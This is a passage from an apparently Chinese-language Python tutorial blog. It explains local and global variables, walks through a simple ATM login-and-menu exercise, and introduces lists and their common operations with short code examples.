报错:name &#x27;a&#x27; is not defined</span></span><br></pre></td></tr></table></figure><ul><li>变量<code>a</code>是定义在<code>func1</code>函数内部的变量，在函数外部访问&#x2F;另外函数内访问则立即报错<br></li><li>局部变量的作用：在函数体内部，临时保存数据，即当函数调用完成后，则销毁局部变量</li></ul><h3 id="全局变量-1"><a href="#全局变量-1" class="headerlink" title="全局变量"></a><span style="font-size: 24px; font-weight: bold;">全局变量</span><br></h3><p>定义在函数体外部的变量，<span style="color:red">在整个程序范围内都可以使用</span>（作用域在整个程序内）<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">func1()      <span class="comment"># 10</span></span><br><span class="line">func2()      <span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(a)     <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p>只要将<code>a</code>定义在函数体外部，那么<code>a</code>就是全局变量，就能在程序的任意位置使用<br></p><h3 id="global关键字"><a href="#global关键字" class="headerlink" title="global关键字"></a><span style="font-size: 24px; font-weight: bold;">global关键字</span><br></h3><p>我们在<code>func2</code>中更改<code>a</code>的值，最终输出结果并没有影响到全局变量<code>a</code>在其他位置的赋值<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    a = <span class="number">20</span>   <span class="comment"># 更改a的赋值</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">func1()      <span class="comment"># 10</span></span><br><span class="line">func2()      <span class="comment"># 20</span></span><br><span class="line"><span class="built_in">print</span>(a)     <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p>这是因为<code>a</code>在<code>func2</code>中，变成了局部变量，而修改这个局部变量不会影响到全局变量<br><br>但，我们就是想要在<code>func2</code>中改变全局变量<code>a</code>的值，该怎么办呢？<br><br>我们可以使用<code>global</code>关键字，来声明变量<code>a</code>是全局变量，这样就可以在函数中修改全局变量了<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="keyword">global</span> a   <span class="comment"># 声明a是全局变量</span></span><br><span class="line">    a = <span class="number">20</span>     <span class="comment"># 更改a的赋值</span></span><br><span class="line">    <span class="built_in">print</span>(a)   <span class="comment"># 20</span></span><br><span class="line"></span><br><span class="line">func1()      <span class="comment"># 10</span></span><br><span class="line">func2()      <span class="comment"># 20</span></span><br><span class="line"><span class="built_in">print</span>(a)     <span class="comment"># 20</span></span><br></pre></td></tr></table></figure><p>此时我们可以看到，全局变量<code>a</code>的值也被修改了<br></p><h2 id="程序实战"><a href="#程序实战" class="headerlink" title="程序实战"></a>程序实战</h2><p>完成一个“银行ATM”程序</p><ul><li>程序启动后，<code>显示银行名称</code>：“耄耋银行”，并<code>提醒用户输入用户名密码</code><ul><li><code>默认用户名</code>：“admin”</li><li><code>默认密码</code>：“123456”</li></ul></li><li>如果<code>用户名和密码错误</code>，则<code>输出“用户名或密码错误”</code>，并<code>允许重复输入三次</code></li><li>如果<code>三次均输入错误</code>，则<code>输出“您已被锁定”</code>，并<code>退出程序</code></li><li>如果<code>用户名和密码正确</code>，则输出<code>“登录成功”</code></li><li>登录成功后，显示<code>功能菜单</code><ul><li><code>查询余额</code><ul><li>显示余额(默认余额<code>10000</code>)</li></ul></li><li><code>取款</code><ul><li><code>提示用户输入取款金额</code></li><li><code>判断用户输入金额是否大于余额</code><ul><li>如果<code>大于余额</code>，则<code>输出“余额不足”</code></li><li>如果<code>小于等于余额</code>，则<code>更新余额</code>，并<code>输出“取款成功”</code></li></ul></li></ul></li><li><code>存款</code><ul><li><code>提示用户输入存款金额</code></li><li><code>更新余额</code>，并<code>输出“存款成功”</code></li></ul></li><li><code>退出</code></li></ul></li><li>用户选择<code>退出</code>功能，则<code>显示“谢谢使用，欢迎下次光临”</code>，并<code>退出程序</code></li></ul><p>流程图：<br><br><img src="https://free.picui.cn/free/2025/06/17/68513a81b679e.png" alt="流程图"><br>程序范例：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义余额</span></span><br><span class="line">money = <span class="number">10000</span></span><br><span class="line"><span class="comment"># 定义主程序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_func</span>():</span><br><span class="line">    <span class="keyword">global</span> money    <span class="comment"># 声明全局变量</span></span><br><span class="line">    i = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">0</span>:    <span class="comment"># 一个死循环，只能用break退出，保证返回上级</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;主菜单&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;查看余额 输入1&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;取款 输入2&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;存款 输入3&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;退出 输入4&quot;</span>)</span><br><span class="line">        num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入要办理的业务编号：&quot;</span>))</span><br><span class="line">        <span class="comment"># 查询余额</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;账户还有余额：<span class="subst">&#123;money&#125;</span>元&quot;</span>)</span><br><span class="line">        <span class="comment"># 取款</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;账户还有余额：<span class="subst">&#123;money&#125;</span>元&quot;</span>)</span><br><span class="line">            <span class="keyword">while</span> i &lt; <span class="number">0</span>:</span><br><span class="line">                x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;要取多少钱：&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> x &gt; money:       <span class="comment"># 判断余额是否充足</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;余额不足&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    money = money - x</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 存款</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;账户还有余额：<span class="subst">&#123;money&#125;</span>元&quot;</span>)</span><br><span class="line">            x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;要存多少钱：&quot;</span>))</span><br><span class="line">            money = money + x</span><br><span class="line">        <span class="comment"># 退出</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示银行名称</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;欢迎来到耄耋银行！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断用户名密码是否正确</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    name = <span class="built_in">input</span>(<span class="string">&quot;用户名：&quot;</span>)</span><br><span class="line">    password = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;密码：&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&quot;admin&quot;</span>:             <span class="comment"># 判断用户名是否正确</span></span><br><span class="line">        <span class="keyword">if</span> password == <span class="number">123456</span>:      <span class="comment"># 判断密码是否正确</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line">            main_func()             <span class="comment"># 进入主菜单</span></span><br><span class="line">            <span class="keyword">break</span>                   <span class="comment"># 结束循环，退出程序</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户名或密码错误&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;您已被锁定&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span>                       <span class="comment">#结束循环，退出程序</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;你还有<span class="subst">&#123;<span class="number">2</span> - i&#125;</span>次机会&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;程序已退出&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="数据容器入门"><a href="#数据容器入门" class="headerlink" title="数据容器入门"></a>数据容器入门</h1><p>Python中的数据容器:<br><br>一种可以容纳多份数据的数据类型，容纳的每一份数据称之为1个元素<br><br>每一个元素，可以是任意类型的数据，如<code>字符串</code>、<code>数字</code>、<code>布尔</code>等。<br><br><br><br><br>如果我们想记录一组名字，按照老办法，我们可以定义多个变量，每个变量都用来记录一个名字<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name1 = <span class="string">&quot;张三&quot;</span></span><br><span class="line">name2 = <span class="string">&quot;李四&quot;</span></span><br><span class="line">name3 = <span class="string">&quot;王五&quot;</span></span><br><span class="line">name4 = <span class="string">&quot;赵六&quot;</span></span><br></pre></td></tr></table></figure><p>主播主播，这么记录确实很快捷，但是如果有10000个名字，我们是不是要定义10000个变量呢？有没有更简单高效的表示方法？<br><br>有的兄弟，有的，我们可以使用<code>数据容器</code>来记录一组数据<br></p><blockquote><p>数据容器有<code>列表</code>、<code>元组</code>、<code>集合</code>、<code>字典</code>，我们会在后面的章节中逐个学习<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br></pre></td></tr></table></figure><p>这样一行就解决了原来需要写四行的代码，真是简单而高效，EE又ZZ<br></p><p>数据容器根据特点的不同，如：</p><ul><li>是否支持重复元素</li><li>是否可以修改</li><li>是否有序，等</li></ul><p>分为5类，分别是:<br><br><code>列表(list)</code>、<code>元组(tuple)</code>、<code>字符串(str)</code>、<code>集合(set)</code>、<code>字典(dict)</code>我们将一一学习它们<br></p><h1 id="数据容器：list-列表"><a href="#数据容器：list-列表" class="headerlink" title="数据容器：list(列表)"></a><span style="font-size: 30px; font-weight: bold;">数据容器：list(列表)</span><br></h1><h2 id="列表的定义"><a href="#列表的定义" class="headerlink" title="列表的定义"></a><span style="font-size: 24px; font-weight: bold;">列表的定义</span><br></h2><p>定义语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字面量</span></span><br><span class="line">[元素<span class="number">1</span>，元素<span class="number">2</span>，元素<span class="number">3</span>，元素<span class="number">4</span>，...]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义变量</span></span><br><span class="line">变量名称 =[元素<span class="number">1</span>，元素<span class="number">2</span>，元素<span class="number">3</span>，元素<span class="number">4</span>，...]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义空列表</span></span><br><span class="line">变量名称 =[]</span><br><span class="line">变量名称 = <span class="built_in">list</span>()</span><br></pre></td></tr></table></figure><p>列表内的每一个数据，我们可以叫它<code>元素</code><br></p><ul><li>以<code>[]</code>为标识</li><li>每个<code>元素</code>之间用逗号隔开</li></ul><h2 id="列表的下标索引"><a href="#列表的下标索引" class="headerlink" title="列表的下标索引"></a><span style="font-size: 24px; font-weight: bold;">列表的下标索引</span><br></h2><p>如何从列表中取出特定位置的数据呢?<br><br>我们可以使用：<code>下标索引</code><br><br>格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">列表名称[下标索引]</span><br></pre></td></tr></table></figure><p><code>下标索引</code>也分为<code>正向索引</code>和<code>反向索引</code>两种<br></p><h3 id="正向索引"><a href="#正向索引" class="headerlink" title="正向索引"></a><span style="font-size: 24px; font-weight: bold;">正向索引</span><br></h3><p><strong>从前往后取</strong><br><br><code>正向索引</code>列表的构造如下图所示：<br><br><img src="https://free.picui.cn/free/2025/06/18/6852242536081.png" alt="正向索引列表的构造"><br>可以看到：</p><ul><li>列表的下标索引从<code>0</code>开始</li><li>每个<code>元素</code>都有一个下标索引，用来标识它在列表中的位置</li><li>我们可以使用下标索引来取出列表中的元素</li><li>下标索引的取值范围是：<code>0 ~ n-1</code></li></ul><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(names[<span class="number">0</span>]) <span class="comment"># 张三</span></span><br></pre></td></tr></table></figure><h3 id="反向索引"><a href="#反向索引" class="headerlink" title="反向索引"></a><span style="font-size: 24px; font-weight: bold;">反向索引</span><br></h3><p><strong>从后往前取</strong><br><br><code>反向索引</code>列表的构造如下图所示：<br><br><img src="https://free.picui.cn/free/2025/06/18/6852255f9345b.png" alt="反向索引列表的构造"><br>可以看到：</p><ul><li>反向索引的下标索引从<code>-1</code>开始</li><li>每个<code>元素</code>都有一个反向索引，用来标识它在反向列表中的位置</li><li>我们可以使用反向索引来取出列表中的元素</li><li>反向索引的取值范围是：<code>-n ~ -1</code></li></ul><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(names[-<span class="number">4</span>]) <span class="comment"># 张三</span></span><br></pre></td></tr></table></figure><h3 id="嵌套列表的下标索引"><a href="#嵌套列表的下标索引" class="headerlink" title="嵌套列表的下标索引"></a><span style="font-size: 24px; font-weight: bold;">嵌套列表的下标索引</span><br></h3><p><code>嵌套列表</code>也支持下标索引，结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">列表名称[下标索引<span class="number">1</span>][下标索引<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>意思是：先取出<code>下标索引1</code>的元素，再取出这个元素的<code>下标索引2</code>的元素<br><br>示例如下：<br><img src="https://free.picui.cn/free/2025/06/18/68522ab6d7aca.png" alt="嵌套列表的下标索引"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">names = [[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>],[<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]]</span><br><span class="line"><span class="built_in">print</span>(names[<span class="number">0</span>][<span class="number">0</span>]) <span class="comment"># 张三</span></span><br></pre></td></tr></table></figure><h2 id="列表的常用操作"><a href="#列表的常用操作" class="headerlink" title="列表的常用操作"></a><span style="font-size: 24px; font-weight: bold;">列表的常用操作</span><br></h2><p><img src="https://free.picui.cn/free/2025/06/18/68524f681948a.png" alt="列表的常用操作"><br><br>上面是列表的常用操作，下面我们将分门别类的讲解如何使用：<br></p><h3 id="列表的查询功能（-index）"><a href="#列表的查询功能（-index）" class="headerlink" title=" 列表的查询功能（.index）"></a><span style="font-size: 24px; font-weight: bold;"><a id="index-list"></a> 列表的查询功能（.index）</span><br></h3><p>查找某元素的下标<br><br>功能:查找指定元素在列表的下标，如果找不到，报错<code>ValueError</code><br><br>语法:<code>列表.index(元素)</code><br><br><code>index</code>就是列表对象(变量)内置的方法(函数)<br><br>使用示例如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(names.index(<span class="string">&quot;张三&quot;</span>)) <span class="comment"># 0</span></span><br><span class="line"><span class="built_in">print</span>(names.index(<span class="string">&quot;赵六&quot;</span>)) <span class="comment"># 3</span></span><br><span class="line"><span class="built_in">print</span>(names.index(<span class="string">&quot;钱七&quot;</span>)) <span class="comment"># ValueError: &#x27;钱七&#x27; is not in list</span></span><br></pre></td></tr></table></figure><blockquote><p>注意！</p><ol><li>如果列表中存在多个相同的元素，<code>index</code>方法只会返回第一个元素的下标</li><li>如果要查找的元素不在列表中，会报错<code>ValueError</code></li><li>嵌套列表中，<code>index</code>方法只能查找第一层的元素</li></ol></blockquote><h3 id="列表的修改功能（修改特殊位置的值）"><a href="#列表的修改功能（修改特殊位置的值）" class="headerlink" title="列表的修改功能（修改特殊位置的值）"></a><span style="font-size: 24px; font-weight: bold;">列表的修改功能（修改特殊位置的值）</span><br></h3><p>语法：<code>列表[下标索引] = 新值</code><br><br>可以使用如上语法，直接对指定下标(正向、反向下标均可)的值进行：<b>重新赋值(修改)</b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;]</span></span><br><span class="line">names[<span class="number">0</span>] = <span class="string">&quot;钱七&quot;</span></span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;钱七&quot;,&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;] 成功的将 第0个元素 张三 修改成了 钱七</span></span><br></pre></td></tr></table></figure><blockquote><p>注意！</p><ol><li>列表的下标索引不能越界，否则会报错<code>IndexError</code></li><li>修改功能支持<code>正向索引</code>和<code>反向索引</code></li></ol></blockquote><h3 id="列表的插入功能（-insert）"><a href="#列表的插入功能（-insert）" class="headerlink" title="列表的插入功能（.insert）"></a><span style="font-size: 24px; font-weight: bold;">列表的插入功能（.insert）</span><br></h3><p>语法：<code>列表.insert(下标索引,元素)</code><br><br>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;]</span></span><br><span class="line">names.insert(<span class="number">3</span>,<span class="string">&quot;钱七&quot;</span>)  <span class="comment"># 在下标索引 3 的位置插入元素 &quot;钱七&quot;</span></span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;,&quot;钱七&quot;,&quot;赵六&quot;]</span></span><br></pre></td></tr></table></figure><h3 id="列表的元素追加（-append-extend）"><a href="#列表的元素追加（-append-extend）" class="headerlink" title="列表的元素追加（.append &#x2F; .extend）"></a><span style="font-size: 24px; font-weight: bold;">列表的元素追加（.append &#x2F; .extend）</span><br></h3><p><span style="font-size: 24px; font-weight: bold;">.append</span><br><br>功能：在列表的末尾追加<code>元素</code><br><br>语法：<code>列表.append(元素)</code><br><br>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;]</span></span><br><span class="line">names.append(<span class="string">&quot;钱七&quot;</span>)  <span class="comment"># 在列表的末尾追加元素 &quot;钱七&quot;</span></span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;,&quot;钱七&quot;]</span></span><br></pre></td></tr></table></figure><p><span style="font-size: 24px; font-weight: bold;">.extend</span><br><br>功能：在列表的末尾追加<code>多个元素</code><br><br>语法：<code>列表.extend(多个元素)</code><br><br>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line">names.extend([<span class="string">&quot;钱七&quot;</span>,<span class="string">&quot;孙八&quot;</span>])  <span class="comment"># 在列表的末尾追加多个元素 [&quot;钱七&quot;,&quot;孙八&quot;]</span></span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;,&quot;钱七&quot;,&quot;孙八&quot;]</span></span><br></pre></td></tr></table></figure><h3 id="列表的删除功能（-remove-pop-del-clear）"><a href="#列表的删除功能（-remove-pop-del-clear）" class="headerlink" title="列表的删除功能（.remove &#x2F; .pop &#x2F; del &#x2F; clear）"></a><span style="font-size: 24px; font-weight: bold;">列表的删除功能（.remove &#x2F; .pop &#x2F; del &#x2F; clear）</span><br></h3><p><span style="font-size: 20px; font-weight: bold;">.remove</span><br><br>功能：根据<code>元素的值</code>删除元素<br><br>语法：<code>列表.remove(元素)</code><br><br>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line">names.remove(<span class="string">&quot;张三&quot;</span>)  <span class="comment"># 删除元素 &quot;张三&quot;</span></span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;]</span></span><br></pre></td></tr></table></figure><blockquote><p>注意！<br><br>如果要删除的元素有多个，只会删除第一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>,<span class="string">&quot;张三&quot;</span>]</span><br><span class="line">names.remove(<span class="string">&quot;张三&quot;</span>)  <span class="comment"># 删除元素 &quot;张三&quot;</span></span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;,&quot;张三&quot;] 只删除了第一个 &quot;张三&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p><span style="font-size: 20px; font-weight: bold;"><a id="pop_list"></a>.pop</span><br><br>功能：根据<code>下标索引</code>删除元素<br><br>语法：<code>列表.pop(下标索引)</code><br><br>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line">names.pop(<span class="number">0</span>)  <span class="comment"># 删除下标索引 0 的元素 &quot;张三&quot;</span></span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;]</span></span><br></pre></td></tr></table></figure><p><span style="font-size: 20px; font-weight: bold;">.dle</span><br><br>功能：根据<code>下标索引</code>删除元素<br><br>语法：<code>del 列表[下标索引]</code><br><br>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"><span class="keyword">del</span> names[<span class="number">0</span>]  <span class="comment"># 删除下标索引 0 的元素 &quot;张三&quot;</span></span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># [&quot;李四&quot;,&quot;王五&quot;,&quot;赵六&quot;]</span></span><br></pre></td></tr></table></figure><p><span style="font-size: 20px; font-weight: bold;"><a id="clear_list"></a>.clear</span><br><br>功能：清空列表内的所有元素<br>语法：<code>列表.clear()</code><br>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line">names.clear()</span><br><span class="line"><span class="built_in">print</span>(names) <span class="comment"># []   （清空列表内的所有元素）</span></span><br></pre></td></tr></table></figure><h3 id="列表内元素数量统计（len）"><a href="#列表内元素数量统计（len）" class="headerlink" title=" 列表内元素数量统计（len）"></a><span style="font-size: 24px; font-weight: bold;"> <a id="len-list"></a>列表内元素数量统计（len）</span><br></h3><p>功能：统计列表内元素的数量<br><br>语法：<code>len(列表)</code><br><br>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">names = [<span 